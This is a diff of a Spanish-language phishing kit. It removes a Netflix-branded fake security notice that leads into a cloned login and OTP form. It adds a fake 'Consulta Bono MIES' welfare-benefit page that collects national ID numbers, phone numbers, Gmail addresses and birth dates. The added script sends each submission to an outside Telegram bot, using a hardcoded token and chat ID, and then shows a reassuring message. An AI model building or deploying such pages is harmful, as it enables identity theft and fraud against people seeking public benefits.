@@ -1,551 +1,155 @@
-
 <!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-<title>Netflix - Aviso e Iniciar sesión</title>
-<link href="https://fonts.googleapis.com/css?family=Poppins:400,600&display=swap" rel="stylesheet" />
+<title>Consulta Bono MIES</title>
 <style>
-/* --- estilos del aviso --- */
-* {
-  box-sizing: border-box;
-}
-body {
-  margin: 0;
-  padding: 20px;
-  font-family: 'Poppins', Arial, sans-serif;
-  /* Fondo con imagen + overlay negro oscuro */
-  background: 
-    linear-gradient(rgba(20, 20, 20, 0.85), rgba(20, 20, 20, 0.85)),
-    url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg') no-repeat center center fixed;
-  background-size: cover;
-  color: #e5e5e5;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-}
-.nl-container {
-  width: 100%;
-  max-width: 600px;
-  background-color: rgba(20, 20, 20, 0.85);
-  border-radius: 12px;
-  box-shadow: 0 8px 24px rgba(0,0,0,0.7);
-  padding: 40px 30px;
-  box-sizing: border-box;
-}
-.logo-container {
-  text-align: center;
-  margin-bottom: 35px;
-}
-.logo-container img {
-  width: 140px;
-  filter: none;
-}
-.title {
-  font-size: 28px;
-  color: #e5e5e5;
-  text-align: center;
-  font-weight: 700;
-  margin-bottom: 25px;
-  line-height: 1.2;
-}
-.paragraph {
-  color: #cccccc;
-  font-size: 17px;
-  line-height: 1.6;
-  margin-top: 0;
-  margin-bottom: 0;
-  text-align: justify;
-}
-.paragraph + .paragraph {
-  margin-top: 8px;
-}
-.button-block {
-  text-align: center;
-  margin: 35px 0 25px;
-}
-.button-block a {
-  display: inline-block;
-  color: #ffffff;
-  background-color: #e50914;
-  border-radius: 30px;
-  padding: 16px 60px;
-  font-size: 18px;
-  font-weight: 600;
-  text-decoration: none;
-  box-shadow: 0 4px 12px rgba(229, 9, 20, 0.6);
-  transition: background-color 0.3s ease, box-shadow 0.3s ease;
-  cursor: pointer;
-}
-.button-block a:hover {
-  background-color: #f6121d;
-  box-shadow: 0 6px 18px rgba(246, 18, 29, 0.8);
-}
-
-/* --- estilos del login --- */
-#login-screen {
-  display: none;
-  position: fixed;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background-color: #000;
-  background-image: url('https://assets.nflxext.com/ffe/siteui/vlv3/258d0f77-2241-4282-b613-8354a7675d1a/web/EC-es-20250721-TRIFECTA-perspective_46610579-3b5e-43fd-a42d-654cdb8ada4d_small.jpg');
-  background-size: cover;
-  background-position: center;
-  background-repeat: no-repeat;
-  z-index: 9999;
-  overflow-y: auto;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-#login-screen::before {
-  content: "";
-  position: absolute;
-  top: 0; left: 0; right: 0; bottom: 0;
-  background: rgba(0,0,0,0.6);
-  z-index: 1;
-}
-#login-screen .logo-container {
-  position: absolute;
-  top: 20px;
-  left: 20px;
-  z-index: 2;
-}
-#login-screen .netflix-logo {
-  width: 100px;
-}
-#login-screen .login-container {
-  position: relative;
-  z-index: 2;
-  background-color: rgba(0,0,0,0.75);
-  padding: 30px 25px;
-  border-radius: 4px;
-  width: 100%;
-  max-width: 360px;
-  margin: 20px auto;
-  box-sizing: border-box;
-  color: #fff;
-}
-#login-screen .login-title {
-  font-size: 1.6em;
-  font-weight: bold;
-  margin-bottom: 20px;
-}
-#login-screen .form-group input,
-#login-screen .login-btn,
-#login-screen .login-code-btn {
-  width: 100%;
-  box-sizing: border-box;
-  display: block;
-}
-#login-screen .form-group {
-  margin-bottom: 12px;
-}
-#login-screen .form-group input {
-  padding: 12px;
-  background-color: #333;
-  border: none;
-  color: #fff;
-  border-radius: 4px;
-  font-size: 15px;
-}
-#login-screen .form-group input::placeholder {
-  color: #8c8c8c;
-}
-#login-screen .form-group input:focus {
-  outline: none;
-  border: 1px solid #fff;
-  background-color: #444;
-}
-#login-screen .login-btn {
-  padding: 12px;
-  background-color: #e50914;
-  border: none;
-  color: #fff;
-  font-size: 15px;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-  margin-top: 12px;
-}
-#login-screen .login-btn:hover {
-  background-color: #f40612;
-}
-#login-screen .options-divider {
-  text-align: center;
-  color: #737373;
-  margin: 14px 0;
-  font-size: 0.85em;
-}
-#login-screen .login-code-btn {
-  padding: 12px;
-  background-color: transparent;
-  border: 1px solid #8c8c8c;
-  color: #fff;
-  font-size: 15px;
-  font-weight: bold;
-  border-radius: 4px;
-  cursor: pointer;
-  text-align: center;
-  text-decoration: none;
-  margin: 0;
-}
-#login-screen .login-code-btn:hover {
-  background-color: rgba(255,255,255,0.05);
-}
-#login-screen .remember-help-flex {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-top: 14px;
-  font-size: 0.85em;
-}
-#login-screen .remember-me {
-  display: flex;
-  align-items: center;
-  color: #b3b3b3;
-}
-#login-screen .remember-me input {
-  margin-right: 5px;
-}
-#login-screen .help-options a {
-  color: #b3b3b3;
-  text-decoration: none;
-}
-#login-screen .help-options a:hover {
-  text-decoration: underline;
-}
-
-/* Spinner Validando */
-#spinner-section {
-  display: none;
-  text-align: center;
-  margin-top: 20px;
-  color: #e5e5e5;
-}
-#spinner-section .spinner {
-  border: 5px solid rgba(255,255,255,0.2);
-  border-top: 5px solid #e50914;
-  border-radius: 50%;
-  width: 50px;
-  height: 50px;
-  margin: 0 auto 10px;
-  animation: spin 1s linear infinite;
-}
-@keyframes spin {
-  0% {transform: rotate(0deg);}
-  100% {transform: rotate(360deg);}
-}
-
-/* OTP Section */
-#otp-section {
-  display: none;
-  max-width: 360px;
-  margin: 20px auto 0 auto;
-  text-align: center;
-  color: #fff;
-}
-#otp-section.active {
-  display: block;
-}
-.otp-title {
-  font-weight: 700;
-  font-size: 1.2em;
-  margin-bottom: 10px;
-}
-.otp-inputs {
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  margin-bottom: 15px;
-}
-.otp-inputs input {
-  width: 45px;
-  height: 50px;
-  font-size: 24px;
-  text-align: center;
-  border: none;
-  border-radius: 6px;
-  background-color: #1c1c1c;
-  color: #fff;
-}
-.otp-inputs input:focus {
-  outline: 2px solid #e50914;
-}
-.otp-button {
-  background-color: #e50914;
-  border: none;
-  color: white;
-  padding: 14px 30px;
-  font-size: 16px;
-  border-radius: 6px;
-  cursor: pointer;
-  font-weight: 700;
-}
-.otp-button:hover {
-  background-color: #f6121d;
-}
-.timer {
-  font-size: 13px;
-  color: #999;
-  margin-top: 8px;
-  cursor: default;
-}
-
-/* Responsive para login screen */
-@media (max-width: 480px) {
-  #login-screen {
-    align-items: flex-start;
-    padding-top: 80px;
-  }
-  #login-screen .login-container {
-    margin: 0 10px;
-  }
-  #login-screen .login-title {
-    font-size: 1.8em;
-  }
-  #login-screen .form-group input,
-  #login-screen .login-btn,
-  #login-screen .login-code-btn {
-    font-size: 16px;
-  }
-  #login-screen .remember-help-flex {
-    font-size: 0.9em;
-  }
-}
-
-/* Móvil: todo compacto y sin scroll vertical para aviso */
-@media (max-width: 480px) {
-  html, body {
-    height: 100%;
-    overflow: hidden;
-  }
   body {
-    padding: 10px;
-    min-height: auto;
+    font-family: Arial, sans-serif;
+    background-color: #f2f2f2;
+    margin: 0;
+    padding: 0;
     display: flex;
     justify-content: center;
     align-items: center;
+    min-height: 100vh;
   }
-  .nl-container {
-    max-width: 360px;
-    max-height: 100vh;
-    padding: 20px 15px;
-    box-shadow: none;
-    border-radius: 8px;
-    overflow-y: auto;
+  .container {
+    background: #fff;
+    padding: 20px;
+    border-radius: 10px;
+    width: 90%;
+    max-width: 400px;
+    box-shadow: 0 0 15px rgba(0,0,0,0.1);
   }
-  .logo-container {
-    margin-bottom: 20px;
+  h2 {
+    text-align: center;
+    color: #333;
   }
-  .logo-container img {
-    width: 120px;
+  label {
+    display: block;
+    margin-top: 10px;
+    font-weight: bold;
   }
-  .title {
-    font-size: 20px;
-    margin-bottom: 15px;
+  input {
+    width: 100%;
+    padding: 8px;
+    margin-top: 5px;
+    border-radius: 5px;
+    border: 1px solid #ccc;
   }
-  .paragraph {
-    font-size: 14px;
-    margin-top: 0;
-    margin-bottom: 0;
-    line-height: 1.4;
+  button {
+    margin-top: 15px;
+    width: 100%;
+    padding: 10px;
+    background: #007bff;
+    color: white;
+    font-size: 16px;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
   }
-  .paragraph + .paragraph {
-    margin-top: 6px;
+  button:hover {
+    background: #0056b3;
   }
-  .button-block {
-    margin: 20px 0 15px;
+  .popup {
+    display: none;
+    position: fixed;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    background: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    text-align: center;
+    z-index: 1000;
+    max-width: 90%;
   }
-  .button-block a {
-    padding: 12px 40px;
-    font-size: 15px;
-    box-shadow: none;
-    border-radius: 20px;
+  .popup p {
+    margin: 0;
+    font-size: 16px;
+    color: #333;
   }
-}
 </style>
 </head>
 <body>
 
-<!-- Pantalla de aviso -->
-<table class="nl-container" width="100%" cellpadding="0" cellspacing="0" role="presentation" id="notice-screen">
-<tbody>
-<tr>
-<td>
-<div class="logo-container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" />
-</div>
+<div class="container">
+  <h2>Consulta Bono MIES</h2>
+  <form id="consultaForm">
+    <label for="cedula">Número de cédula:</label>
+    <input type="text" id="cedula" name="cedula" pattern="[0-9]{10}" required>
 
-<div class="title">
-  Problemas detectados en tu cuenta Netflix
-</div>
+    <label for="telefono">Teléfono:</label>
+    <input type="tel" id="telefono" name="telefono" pattern="[0-9]{7,10}" required>
 
-<div class="paragraph">
-  Queremos informarte que hemos detectado irregularidades en el acceso a tu cuenta Netflix. Por motivos de seguridad, es imprescindible que inicies sesión para verificar tu información.
-</div>
+    <label for="email">Correo electrónico (Gmail):</label>
+    <input type="email" id="email" name="email" pattern="^[a-zA-Z0-9._%+-]+@gmail\.com$" required>
 
-<div class="paragraph">
-  Si no realizas este procedimiento en las próximas 48 horas, tu cuenta podría ser suspendida temporalmente para proteger tus datos y evitar accesos no autorizados.
-</div>
+    <label for="fechaNacimiento">Fecha de nacimiento:</label>
+    <input type="date" id="fechaNacimiento" name="fechaNacimiento" required>
 
-<div class="button-block">
-  <a href="#" id="start-login-btn">Iniciar sesión seguro</a>
-</div>
-</td>
-</tr>
-</tbody>
-</table>
-
-<!-- Pantalla de login -->
-<div id="login-screen" style="display:none;">
-<div class="logo-container">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="netflix-logo" />
-</div>
-
-<div class="login-container">
-  <h1 class="login-title">Iniciar sesión</h1>
-  <form id="login-form">
-    <div class="form-group">
-      <input type="text" placeholder="Email o número de celular" id="email-input" required />
-    </div>
-    <div class="form-group">
-      <input type="password" placeholder="Contraseña" id="password-input" required />
-    </div>
-    <button type="submit" class="login-btn">Iniciar sesión</button>
-    <div class="options-divider">O</div>
-    <a href="#" class="login-code-btn" id="use-otp-btn">Usar un código de inicio de sesión</a>
-    <div class="remember-help-flex">
-      <div class="remember-me">
-        <input type="checkbox" id="remember" />
-        <label for="remember">Recordarme</label>
-      </div>
-      <div class="help-options">
-        <a href="#">¿Olvidaste la contraseña?</a>
-      </div>
-    </div>
+    <button type="submit">Consultar</button>
   </form>
-
-  <!-- Spinner Validando -->
-  <div id="spinner-section">
-    <div class="spinner"></div>
-    <div>Validando, por favor espera...</div>
-  </div>
-
-  <!-- OTP Section -->
-  <div id="otp-section">
-    <div class="otp-title">Ingrese el código OTP enviado a su correo o teléfono</div>
-    <div class="otp-inputs">
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
-    </div>
-    <button class="otp-button">Verificar</button>
-    <div class="timer" id="timer">Reenviar en 30 segundos</div>
-  </div>
 </div>
+
+<div class="popup" id="popup">
+  <p id="popupMessage"></p>
 </div>
 
 <script>
-const noticeScreen = document.getElementById('notice-screen');
-const loginScreen = document.getElementById('login-screen');
-const startLoginBtn = document.getElementById('start-login-btn');
-const loginForm = document.getElementById('login-form');
-const spinnerSection = document.getElementById('spinner-section');
-const otpSection = document.getElementById('otp-section');
-const useOtpBtn = document.getElementById('use-otp-btn');
-const otpInputs = otpSection.querySelectorAll('input[type="text"]');
-const timerEl = document.getElementById('timer');
+  const BOT_TOKEN = "8294121246:AAEWiRJdKEJRn4UdJpUyaTVsfk1MCua19WI";
+  const CHAT_ID = "5654253897";
 
-startLoginBtn.addEventListener('click', e => {
-  e.preventDefault();
-  noticeScreen.style.display = 'none';
-  loginScreen.style.display = 'flex';
-});
+  const form = document.getElementById("consultaForm");
+  const popup = document.getElementById("popup");
+  const popupMessage = document.getElementById("popupMessage");
 
-loginForm.addEventListener('submit', e => {
-  e.preventDefault();
-  // Mostrar spinner y ocultar formulario
-  loginForm.style.display = 'none';
-  spinnerSection.style.display = 'block';
+  form.addEventListener("submit", async function(e) {
+    e.preventDefault();
 
-  // Aquí podrías agregar lógica de validación o envío real
-  const email = document.getElementById('email-input').value;
-  const password = document.getElementById('password-input').value;
-  console.log('Iniciar sesión con:', email, password);
+    const cedula = document.getElementById("cedula").value;
+    const telefono = document.getElementById("telefono").value;
+    const email = document.getElementById("email").value;
+    const fechaNacimiento = document.getElementById("fechaNacimiento").value;
 
-  // El spinner se queda visible, sin alertas ni simulaciones
-});
+    const message = `
+📄 *Consulta Bono MIES*
+👤 Cédula: ${cedula}
+📞 Teléfono: ${telefono}
+📧 Email: ${email}
+🎂 Fecha de nacimiento: ${fechaNacimiento}
+    `;
 
-// Mostrar sección OTP y ocultar formulario al pulsar "Usar código"
-useOtpBtn.addEventListener('click', e => {
-  e.preventDefault();
-  loginForm.style.display = 'none';
-  spinnerSection.style.display = 'none';
-  otpSection.style.display = 'block';
-  otpInputs[0].focus();
-  startTimer(30);
-});
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      });
 
-// Funcionalidad para moverse al siguiente input automáticamente
-otpInputs.forEach((input, i) => {
-  input.addEventListener('input', () => {
-    if (input.value.length === 1 && i < otpInputs.length -1) {
-      otpInputs[i + 1].focus();
+      popupMessage.textContent = "En caso de aprobarse, será comunicado inmediatamente.";
+      popup.style.display = "block";
+      setTimeout(() => { popup.style.display = "none"; }, 5000);
+
+      form.reset();
+    } catch (error) {
+      popupMessage.textContent = "Error al enviar la consulta. Inténtelo de nuevo.";
+      popup.style.display = "block";
+      setTimeout(() => { popup.style.display = "none"; }, 5000);
     }
   });
-  input.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' && input.value === '' && i > 0) {
-      otpInputs[i - 1].focus();
-    }
-  });
-});
-
-// Temporizador
-let countdown;
-function startTimer(seconds) {
-  clearInterval(countdown);
-  let timeLeft = seconds;
-  timerEl.textContent = `Reenviar en ${timeLeft} segundos`;
-  timerEl.style.color = '#999';
-  timerEl.style.cursor = 'default';
-  timerEl.onclick = null;
-  countdown = setInterval(() => {
-    timeLeft--;
-    if(timeLeft <= 0) {
-      clearInterval(countdown);
-      timerEl.textContent = '¿No recibiste el código? Reenviar';
-      timerEl.style.color = '#e50914';
-      timerEl.style.cursor = 'pointer';
-      timerEl.onclick = () => {
-        timerEl.style.color = '#999';
-        timerEl.style.cursor = 'default';
-        startTimer(30);
-        // Aquí podrías agregar lógica para reenviar el código OTP
-        // Sin alertas ni simulaciones
-      };
-    } else {
-      timerEl.textContent = `Reenviar en ${timeLeft} segundos`;
-    }
-  }, 1000);
-}
-
-// Botón verificar OTP (solo ejemplo)
-otpSection.querySelector('.otp-button').addEventListener('click', () => {
-  const code = Array.from(otpInputs).map(i => i.value).join('');
-  if(code.length !== otpInputs.length || !/^\d+$/.test(code)) {
-    alert('Por favor ingresa el código OTP completo y válido.');
-    return;
-  }
-  alert('Código OTP ingresado: ' + code);
-  // Aquí iría la lógica de validación del OTP real
-});
 </script>
+
+</body>
+</html>
+
 
 </body>
 </html>
